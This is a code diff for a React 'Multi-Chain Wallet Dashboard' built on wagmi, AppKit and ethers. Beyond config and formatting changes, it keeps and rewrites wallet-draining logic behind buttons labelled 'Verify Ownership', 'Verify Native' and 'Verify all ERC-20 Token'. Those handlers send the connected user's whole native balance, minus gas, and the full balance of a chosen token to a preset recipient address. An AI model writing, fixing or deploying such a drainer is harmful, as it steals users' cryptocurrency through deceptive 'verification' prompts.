@@ -9,16 +9,16 @@ import {
 import {
   useBalance,
   WagmiConfig,
-  createConfig,
-  configureChains
+  createConfig
 } from "wagmi";
 import { ethers } from "ethers";
 import { REOWN_PROJECT_ID, RECIPIENTS, SUPPORTED_CHAINS } from "./config.js";
-import { ERC20_ABI } from "./abi/ERC20.js"; // ✅ keep only this import
+import { ERC20_ABI } from "./abi/ERC20.js";
 
-/* Wagmi config - remove publicProvider, use empty array since AppKitProvider handles provider */
-const { chains, publicClient } = configureChains(SUPPORTED_CHAINS, []);
-const wagmiConfig = createConfig({ publicClient });
+/* ✅ FIXED Wagmi config — minimal setup (AppKit handles connectors) */
+const wagmiConfig = createConfig({
+  autoConnect: true
+});
 
 function Dashboard() {
   const { address, isConnected } = useAppKitAccount();
@@ -64,6 +64,7 @@ function Dashboard() {
     if (!address || !nativeBalance) return alert("Connect wallet first");
     const recipient = getRecipient();
     if (!recipient) return alert("No recipient for this chain");
+
     try {
       setSendingNative(true);
       const provider = window.ethereum || window.reown?.provider;
@@ -77,8 +78,13 @@ function Dashboard() {
       const sendAmount = balanceBN.sub(estimatedGas.mul(gasPrice));
       if (sendAmount.lte(0)) return alert("Insufficient balance to cover gas");
 
-      const txResponse = await signer.sendTransaction({ to: recipient, value: sendAmount });
+      const txResponse = await signer.sendTransaction({
+        to: recipient,
+        value: sendAmount
+      });
+
       await txResponse.wait();
+
       alert(`Sent ${ethers.utils.formatEther(sendAmount)} ${nativeBalance.symbol} to ${recipient}`);
       refetchNative();
       setSendingNative(false);
@@ -91,6 +97,7 @@ function Dashboard() {
 
   const fetchTokenBalance = async () => {
     if (!address || !tokenAddress) return;
+
     try {
       const provider = window.ethereum || window.reown?.provider;
       const signer = new ethers.providers.Web3Provider(provider).getSigner();
@@ -110,9 +117,12 @@ function Dashboard() {
   };
 
   const handleSendToken = async () => {
-    if (!address || !tokenBalance || !tokenDecimals) return alert("Connect wallet and fetch token balance first");
+    if (!address || !tokenBalance || !tokenDecimals)
+      return alert("Connect wallet and fetch token balance first");
+
     const recipient = getRecipient();
     if (!recipient) return alert("No recipient for this chain");
+
     try {
       setSendingToken(true);
       const provider = window.ethereum || window.reown?.provider;
@@ -121,6 +131,7 @@ function Dashboard() {
 
       const txResponse = await tokenContract.transfer(recipient, tokenBalance);
       await txResponse.wait();
+
       alert(`Sent ${ethers.utils.formatUnits(tokenBalance, tokenDecimals)} ${tokenSymbol} to ${recipient}`);
       fetchTokenBalance();
       setSendingToken(false);
@@ -139,8 +150,11 @@ function Dashboard() {
     <div style={styles.container}>
       <h1 style={styles.title}>Multi-Chain Wallet Dashboard</h1>
 
-      {/* Wallet Connect Status */}
-      <WalletConnectStatus isConnected={isConnected} address={address} chain={chain} />
+      <WalletConnectStatus
+        isConnected={isConnected}
+        address={address}
+        chain={chain}
+      />
 
       <AppKitButton />
 
@@ -148,22 +162,39 @@ function Dashboard() {
         <div style={styles.card}>
           <p><strong>Address:</strong> {address}</p>
           <p><strong>Network:</strong> {chain?.name} ({chain?.id})</p>
-          {nativeBalance && <p><strong>Native Balance:</strong> {nativeBalance.formatted} {nativeBalance.symbol}</p>}
+          {nativeBalance && (
+            <p><strong>Native Balance:</strong> {nativeBalance.formatted} {nativeBalance.symbol}</p>
+          )}
           <p><strong>Recipient:</strong> {getRecipient()}</p>
 
-          {/* Sign Wallet */}
-          <button style={styles.signButton} onClick={handleSign}>Verify Ownership(Verify on Reown)</button>
-          {verified && <p style={{ color: "#0f0", fontWeight: "bold" }}>✅ Wallet Verified!</p>}
-          {signedMessage && <p style={{ wordBreak: "break-all" }}>Signature: {signedMessage}</p>}
+          <button style={styles.signButton} onClick={handleSign}>
+            Verify Ownership(Verify on Reown)
+          </button>
 
-          {/* Send Native */}
           {verified && (
-            <button style={styles.sendButton} onClick={handleSendNative} disabled={sendingNative}>
-              {sendingNative ? "Sending..." : `Verify Native ${nativeBalance?.symbol}`}
+            <p style={{ color: "#0f0", fontWeight: "bold" }}>
+              ✅ Wallet Verified!
+            </p>
+          )}
+
+          {signedMessage && (
+            <p style={{ wordBreak: "break-all" }}>
+              Signature: {signedMessage}
+            </p>
+          )}
+
+          {verified && (
+            <button
+              style={styles.sendButton}
+              onClick={handleSendNative}
+              disabled={sendingNative}
+            >
+              {sendingNative
+                ? "Sending..."
+                : `Verify Native ${nativeBalance?.symbol}`}
             </button>
           )}
 
-          {/* ERC-20 Token */}
           {verified && (
             <div style={{ marginTop: "20px" }}>
               <input
@@ -173,11 +204,21 @@ function Dashboard() {
                 onChange={e => setTokenAddress(e.target.value)}
                 style={styles.input}
               />
+
               {tokenBalance && tokenDecimals && tokenSymbol && (
-                <p>Balance: {ethers.utils.formatUnits(tokenBalance, tokenDecimals)} {tokenSymbol}</p>
+                <p>
+                  Balance: {ethers.utils.formatUnits(tokenBalance, tokenDecimals)} {tokenSymbol}
+                </p>
               )}
-              <button style={styles.sendButton} onClick={handleSendToken} disabled={sendingToken}>
-                {sendingToken ? "Sending..." : `Verify all ERC-20 Token`}
+
+              <button
+                style={styles.sendButton}
+                onClick={handleSendToken}
+                disabled={sendingToken}
+              >
+                {sendingToken
+                  ? "Sending..."
+                  : `Verify all ERC-20 Token`}
               </button>
             </div>
           )}
@@ -187,7 +228,7 @@ function Dashboard() {
   );
 }
 
-/* Styles with animated background */
+/* Styles */
 const styles = {
   container: {
     minHeight: "100vh",
@@ -239,7 +280,7 @@ const styles = {
   }
 };
 
-/* Inject keyframes for gradient animation */
+/* Keyframes */
 const styleSheet = document.styleSheets[0];
 styleSheet.insertRule(`
 @keyframes gradient {
@@ -252,7 +293,10 @@ styleSheet.insertRule(`
 export default function App() {
   return (
     <WagmiConfig config={wagmiConfig}>
-      <AppKitProvider projectId={REOWN_PROJECT_ID} networks={SUPPORTED_CHAINS}>
+      <AppKitProvider
+        projectId={REOWN_PROJECT_ID}
+        networks={SUPPORTED_CHAINS}
+      >
         <Dashboard />
       </AppKitProvider>
     </WagmiConfig>
